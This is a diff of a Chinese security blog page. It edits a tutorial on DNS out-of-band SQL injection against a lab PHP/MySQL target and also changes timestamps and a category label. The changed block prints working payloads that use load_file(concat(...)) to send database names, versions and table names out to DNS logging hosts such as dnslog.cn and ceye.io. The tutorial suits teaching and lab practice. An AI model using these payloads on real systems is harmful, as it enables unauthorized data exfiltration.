@@ -15,7 +15,7 @@
 <meta property="og:description" content="PHP-MYSQL-二次注入-DEMO&amp;74CMS DEMO-用户注册登录修改密码 CMS-74CMS个人中心简历功能  黑盒思路：分析代码功能，有INSERT后对数据操作的地方（功能点）白盒思路：INSERT后进入SELECT或UPDATE的功能的代码部分注入条件：插入时有转义的函数或配置，能过后续继续利用INSERT的数据 登录后修改，系统会直接直接获取当前登录的用户名当修改条件 如果">
 <meta property="og:locale">
 <meta property="article:published_time" content="2024-03-20T21:14:30.000Z">
-<meta property="article:modified_time" content="2024-03-20T21:56:15.996Z">
+<meta property="article:modified_time" content="2024-03-20T21:58:00.474Z">
 <meta property="article:author" content="Cypher Sun">
 <meta name="twitter:card" content="summary">
 
@@ -57,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Cypher Sun","root":"/","typed_text":["I`m a cybersecurity engineer","Welcome to my blog!"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","appleTouchIcon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-21 05:56:15"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-21 05:58:00"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -412,13 +412,8 @@
 <li><p>带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：</p>
 </li>
 </ol>
-<p>select load_file(concat(‘\\‘,(select database()),’.7logee.dnslog.cn\aa’));</p>
-<p>union select 1,2,3,load_file(“d:\1.txt”),5,6</p>
-<p>查询当前数据库<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.d7a64120ce.ipv6.1433.eu.org&#x2F;abc’)))</p>
-<p>查询当前版本<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select version()),’.ac45c0ae7c.ipv6.1433.eu.org&#x2F;abc’)))</p>
-<p>查询其他数据库<br>id&#x3D;1 and load_file(concat(“\\“,(select schema_name from information_schema.schemata limit 0,1),”.dbuh8a.ceye.io\xxx.txt”))</p>
-<p>查询当前数据库demo01中第一个表名<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’demo01’ limit 0,1 ),”.ac45c0ae7c.ipv6.1433.eu.org\xxx.txt”))</p>
-<p>查询当前数据库demo01中第二个表名<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’demo01’ limit 1,1 ),”.ac45c0ae7c.ipv6.1433.eu.org\xxx.txt”))</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.7logee.dnslog.cn\\aa&#x27;</span>));</span><br><span class="line"></span><br><span class="line">union <span class="keyword">select</span> 1,2,3,load_file(<span class="string">&quot;d:\\1.txt&quot;</span>),5,6</span><br><span class="line"></span><br><span class="line">查询当前数据库</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.d7a64120ce.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询当前版本</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.ac45c0ae7c.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询其他数据库</span><br><span class="line"><span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> schema_name from information_schema.schemata <span class="built_in">limit</span> 0,1),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line">查询当前数据库demo01中第一个表名</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 0,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line">查询当前数据库demo01中第二个表名</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 1,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br></pre></td></tr></table></figure>
+
 <p>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个数据库名<br>limit 1,1 查询第二个数据库名<br>limit 2,1 查询第三个数据库名</p>
 
 </article>
@@ -449,8 +444,8 @@
         
         <div class="trm-card-descr">
             <div class="trm-label trm-category trm-mb-20">
-                <a href=" #.">
-                    未分类
+                <a href=" /categories/CTF/">
+                    CTF
                 </a>
             </div>
             <h5>
